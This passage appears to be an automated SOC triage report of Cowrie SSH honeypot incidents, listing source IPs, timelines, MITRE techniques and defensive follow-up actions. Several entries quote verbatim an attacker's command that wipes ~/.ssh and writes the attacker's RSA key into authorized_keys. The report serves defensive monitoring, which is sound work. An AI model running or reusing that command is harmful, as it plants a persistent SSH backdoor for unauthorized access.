| `2026-05-30 05:12:34` | `cowrie.session.connect` |
| `2026-05-30 05:12:34` | `cowrie.client.version` |
| `2026-05-30 05:12:35` | `cowrie.client.kex` |
| `2026-05-30 05:12:35` | `cowrie.login.success` |
| `2026-05-30 05:12:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.199.224[.]52` to AbuseIPDB if not already reported
- [ ] Block `197.199.224[.]52` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4cb5bc3bf8e4

| Field | Detail |
|---|---|
| **Source IP** | `185.16.214[.]226` |
| **First Seen** | 2026-05-30 05:14 |
| **Last Seen** | 2026-05-30 05:14 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-30 05:14:47` | `cowrie.session.connect` |
| `2026-05-30 05:14:47` | `cowrie.client.version` |
| `2026-05-30 05:14:47` | `cowrie.client.kex` |
| `2026-05-30 05:14:48` | `cowrie.login.success` |
| `2026-05-30 05:14:48` | `cowrie.session.params` |
| `2026-05-30 05:14:48` | `cowrie.command.input` |
| `2026-05-30 05:14:48` | `cowrie.command.failed` |
| `2026-05-30 05:14:49` | `cowrie.log.closed` |
| `2026-05-30 05:14:49` | `cowrie.session.params` |
| `2026-05-30 05:14:49` | `cowrie.command.input` |
| `2026-05-30 05:14:49` | `cowrie.session.file_download` |
| `2026-05-30 05:14:49` | `cowrie.log.closed` |
| `2026-05-30 05:14:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.16.214[.]226` to AbuseIPDB if not already reported
- [ ] Block `185.16.214[.]226` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-71fc79889a68

| Field | Detail |
|---|---|
| **Source IP** | `185.16.214[.]226` |
| **First Seen** | 2026-05-30 05:14 |
| **Last Seen** | 2026-05-30 05:14 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-30 05:14:51` | `cowrie.session.connect` |
| `2026-05-30 05:14:51` | `cowrie.client.version` |
| `2026-05-30 05:14:52` | `cowrie.client.kex` |
| `2026-05-30 05:14:52` | `cowrie.login.success` |
| `2026-05-30 05:14:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.16.214[.]226` to AbuseIPDB if not already reported
- [ ] Block `185.16.214[.]226` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1bd4368ab1ef

| Field | Detail |
|---|---|
| **Source IP** | `212.115.54[.]84` |
| **First Seen** | 2026-05-30 05:17 |
| **Last Seen** | 2026-05-30 05:17 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-30 05:17:49` | `cowrie.session.connect` |
| `2026-05-30 05:17:49` | `cowrie.client.version` |
| `2026-05-30 05:17:49` | `cowrie.client.kex` |
| `2026-05-30 05:17:50` | `cowrie.login.success` |
| `2026-05-30 05:17:50` | `cowrie.session.params` |
| `2026-05-30 05:17:50` | `cowrie.command.input` |
| `2026-05-30 05:17:50` | `cowrie.command.failed` |
| `2026-05-30 05:17:50` | `cowrie.log.closed` |
| `2026-05-30 05:17:50` | `cowrie.session.params` |
| `2026-05-30 05:17:50` | `cowrie.command.input` |
| `2026-05-30 05:17:51` | `cowrie.session.file_download` |
| `2026-05-30 05:17:51` | `cowrie.log.closed` |
| `2026-05-30 05:17:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `212.115.54[.]84` to AbuseIPDB if not already reported
- [ ] Block `212.115.54[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ed06e2304afa

| Field | Detail |
|---|---|
| **Source IP** | `212.115.54[.]84` |
| **First Seen** | 2026-05-30 05:17 |
| **Last Seen** | 2026-05-30 05:17 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-30 05:17:52` | `cowrie.session.connect` |
| `2026-05-30 05:17:52` | `cowrie.client.version` |
| `2026-05-30 05:17:53` | `cowrie.client.kex` |
| `2026-05-30 05:17:53` | `cowrie.login.success` |
| `2026-05-30 05:17:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `212.115.54[.]84` to AbuseIPDB if not already reported
- [ ] Block `212.115.54[.]84` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a1e431564029

| Field | Detail |
|---|---|
| **Source IP** | `212.115.54[.]84` |
| **First Seen** | 2026-05-30 05:18 |
| **Last Seen** | 2026-05-30 05:18 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-30 05:18:44` | `cowrie.session.connect` |
| `2026-05-30 05:18:44` | `cowrie.client.version` |
| `2026-05-30 05:18:44` | `cowrie.client.kex` |
| `2026-05-30 05:18:45` | `cowrie.login.success` |
| `2026-05-30 05:18:45` | `cowrie.session.params` |
| `2026-05-30 05:18:45` | `cowrie.command.input` |
| `2026-05-30 05:18:45` | `cowrie.command.failed` |
| `2026-05-30 05:18:45` | `cowrie.log.closed` |
| `2026-05-30 05:18:45` | `cowrie.session.params` |
| `2026-05-30 05:18:45` | `cowrie.command.input` |
| `2026-05-30 05:18:46` | `cowrie.session.file_download` |
| `2026-05-30 05:18:46` | `cowrie.log.closed` |
| `2026-05-30 05:18:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `212.115.54[.]84` to AbuseIPDB if not already reported
- [ ] Block `212.115.54[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-631befed3361

| Field | Detail |
|---|---|
| **Source IP** | `212.115.54[.]84` |
| **First Seen** | 2026-05-30 05:18 |
| **Last Seen** | 2026-05-30 05:18 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-30 05:18:48` | `cowrie.session.connect` |
| `2026-05-30 05:18:48` | `cowrie.client.version` |
| `2026-05-30 05:18:48` | `cowrie.client.kex` |
| `2026-05-30 05:18:48` | `cowrie.login.success` |
| `2026-05-30 05:18:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `212.115.54[.]84` to AbuseIPDB if not already reported
- [ ] Block `212.115.54[.]84` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-761fd24ebebc

| Field | Detail |
|---|---|
| **Source IP** | `212.115.54[.]84` |
| **First Seen** | 2026-05-30 05:19 |
| **Last Seen** | 2026-05-30 05:19 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-30 05:19:39` | `cowrie.session.connect` |
| `2026-05-30 05:19:39` | `cowrie.client.version` |
| `2026-05-30 05:19:39` | `cowrie.client.kex` |
| `2026-05-30 05:19:40` | `cowrie.login.success` |
| `2026-05-30 05:19:40` | `cowrie.session.params` |
| `2026-05-30 05:19:40` | `cowrie.command.input` |
| `2026-05-30 05:19:40` | `cowrie.command.failed` |
| `2026-05-30 05:19:40` | `cowrie.log.closed` |
| `2026-05-30 05:19:41` | `cowrie.session.params` |
| `2026-05-30 05:19:41` | `cowrie.command.input` |
| `2026-05-30 05:19:41` | `cowrie.session.file_download` |
| `2026-05-30 05:19:41` | `cowrie.log.closed` |
| `2026-05-30 05:19:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `212.115.54[.]84` to AbuseIPDB if not already reported
- [ ] Block `212.115.54[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-311412a78ac0

| Field | Detail |
|---|---|
| **Source IP** | `212.115.54[.]84` |
| **First Seen** | 2026-05-30 05:19 |
| **Last Seen** | 2026-05-30 05:19 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-30 05:19:43` | `cowrie.session.connect` |
| `2026-05-30 05:19:43` | `cowrie.client.version` |
| `2026-05-30 05:19:43` | `cowrie.client.kex` |
| `2026-05-30 05:19:43` | `cowrie.login.success` |
| `2026-05-30 05:19:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `212.115.54[.]84` to AbuseIPDB if not already reported
- [ ] Block `212.115.54[.]84` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-409b96deba91

| Field | Detail |
|---|---|
| **Source IP** | `197.199.224[.]52` |
| **First Seen** | 2026-05-30 05:19 |
| **Last Seen** | 2026-05-30 05:20 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-30 05:19:52` | `cowrie.session.connect` |
| `2026-05-30 05:19:52` | `cowrie.client.version` |
| `2026-05-30 05:19:52` | `cowrie.client.kex` |
| `2026-05-30 05:19:53` | `cowrie.login.success` |
| `2026-05-30 05:19:54` | `cowrie.session.params` |
| `2026-05-30 05:19:54` | `cowrie.command.input` |
| `2026-05-30 05:19:54` | `cowrie.command.failed` |
| `2026-05-30 05:19:54` | `cowrie.log.closed` |
| `2026-05-30 05:19:55` | `cowrie.session.params` |
| `2026-05-30 05:19:55` | `cowrie.command.input` |
| `2026-05-30 05:19:55` | `cowrie.session.file_download` |
| `2026-05-30 05:19:55` | `cowrie.log.closed` |
| `2026-05-30 05:20:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.199.224[.]52` to AbuseIPDB if not already reported
- [ ] Block `197.199.224[.]52` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f5e4f0d8e23e

| Field | Detail |
|---|---|
| **Source IP** | `197.199.224[.]52` |
| **First Seen** | 2026-05-30 05:19 |
| **Last Seen** | 2026-05-30 05:20 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-30 05:19:58` | `cowrie.session.connect` |
| `2026-05-30 05:19:58` | `cowrie.client.version` |
| `2026-05-30 05:19:59` | `cowrie.client.kex` |
| `2026-05-30 05:20:00` | `cowrie.login.success` |
| `2026-05-30 05:20:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.199.224[.]52` to AbuseIPDB if not already reported
- [ ] Block `197.199.224[.]52` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a2d58b7850f0

| Field | Detail |
|---|---|
| **Source IP** | `197.199.224[.]52` |
| **First Seen** | 2026-05-30 05:21 |
| **Last Seen** | 2026-05-30 05:21 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-30 05:21:22` | `cowrie.session.connect` |
| `2026-05-30 05:21:22` | `cowrie.client.version` |
| `2026-05-30 05:21:22` | `cowrie.client.kex` |
| `2026-05-30 05:21:23` | `cowrie.login.success` |
| `2026-05-30 05:21:24` | `cowrie.session.params` |
| `2026-05-30 05:21:24` | `cowrie.command.input` |
| `2026-05-30 05:21:24` | `cowrie.command.failed` |
| `2026-05-30 05:21:24` | `cowrie.log.closed` |
| `2026-05-30 05:21:25` | `cowrie.session.params` |
| `2026-05-30 05:21:25` | `cowrie.command.input` |
| `2026-05-30 05:21:25` | `cowrie.session.file_download` |
| `2026-05-30 05:21:25` | `cowrie.log.closed` |
| `2026-05-30 05:21:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.199.224[.]52` to AbuseIPDB if not already reported
- [ ] Block `197.199.224[.]52` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bfb996e5818d

| Field | Detail |
|---|---|
| **Source IP** | `197.199.224[.]52` |
| **First Seen** | 2026-05-30 05:21 |
| **Last Seen** | 2026-05-30 05:21 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-30 05:21:27` | `cowrie.session.connect` |
| `2026-05-30 05:21:27` | `cowrie.client.version` |
| `2026-05-30 05:21:28` | `cowrie.client.kex` |
| `2026-05-30 05:21:29` | `cowrie.login.success` |
| `2026-05-30 05:21:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.199.224[.]52` to AbuseIPDB if not already reported
- [ ] Block `197.199.224[.]52` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-547d28eab319

| Field | Detail |
|---|---|
| **Source IP** | `103.12.135[.]35` |
| **First Seen** | 2026-05-30 05:24 |
| **Last Seen** | 2026-05-30 05:24 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-30 05:24:23` | `cowrie.session.connect` |
| `2026-05-30 05:24:23` | `cowrie.client.version` |
| `2026-05-30 05:24:23` | `cowrie.client.kex` |
| `2026-05-30 05:24:23` | `cowrie.login.success` |
| `2026-05-30 05:24:23` | `cowrie.session.params` |
| `2026-05-30 05:24:23` | `cowrie.command.input` |
| `2026-05-30 05:24:23` | `cowrie.command.failed` |
| `2026-05-30 05:24:23` | `cowrie.log.closed` |
| `2026-05-30 05:24:23` | `cowrie.session.params` |
| `2026-05-30 05:24:23` | `cowrie.command.input` |
| `2026-05-30 05:24:23` | `cowrie.session.file_download` |
| `2026-05-30 05:24:23` | `cowrie.log.closed` |
| `2026-05-30 05:24:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.12.135[.]35` to AbuseIPDB if not already reported
- [ ] Block `103.12.135[.]35` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-170de4c8726b

| Field | Detail |
|---|---|
| **Source IP** | `103.12.135[.]35` |
| **First Seen** | 2026-05-30 05:24 |
| **Last Seen** | 2026-05-30 05:24 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-30 05:24:25` | `cowrie.session.connect` |
| `2026-05-30 05:24:25` | `cowrie.client.version` |
| `2026-05-30 05:24:25` | `cowrie.client.kex` |
| `2026-05-30 05:24:25` | `cowrie.login.success` |
| `2026-05-30 05:24:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.12.135[.]35` to AbuseIPDB if not already reported
- [ ] Block `103.12.135[.]35` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1e3502aa3bc9

| Field | Detail |
|---|---|
| **Source IP** | `69.157.68[.]14` |
| **First Seen** | 2026-05-30 05:25 |
| **Last Seen** | 2026-05-30 05:26 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-30 05:25:54` | `cowrie.session.connect` |
| `2026-05-30 05:25:54` | `cowrie.client.version` |
| `2026-05-30 05:25:54` | `cowrie.client.kex` |
| `2026-05-30 05:25:55` | `cowrie.login.success` |
| `2026-05-30 05:25:56` | `cowrie.session.params` |
| `2026-05-30 05:25:56` | `cowrie.command.input` |
| `2026-05-30 05:25:56` | `cowrie.command.failed` |
| `2026-05-30 05:25:56` | `cowrie.log.closed` |
| `2026-05-30 05:25:56` | `cowrie.session.params` |
| `2026-05-30 05:25:56` | `cowrie.command.input` |
| `2026-05-30 05:25:57` | `cowrie.session.file_download` |
| `2026-05-30 05:25:57` | `cowrie.log.closed` |
| `2026-05-30 05:26:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `69.157.68[.]14` to AbuseIPDB if not already reported
- [ ] Block `69.157.68[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a97481888e2e

| Field | Detail |
|---|---|
| **Source IP** | `69.157.68[.]14` |
| **First Seen** | 2026-05-30 05:26 |
| **Last Seen** | 2026-05-30 05:26 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-30 05:26:00` | `cowrie.session.connect` |
| `2026-05-30 05:26:00` | `cowrie.client.version` |
| `2026-05-30 05:26:00` | `cowrie.client.kex` |
| `2026-05-30 05:26:01` | `cowrie.login.success` |
| `2026-05-30 05:26:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `69.157.68[.]14` to AbuseIPDB if not already reported
- [ ] Block `69.157.68[.]14` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-080a27f06250

| Field | Detail |
|---|---|
| **Source IP** | `212.115.54[.]84` |
| **First Seen** | 2026-05-30 05:26 |
| **Last Seen** | 2026-05-30 05:26 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
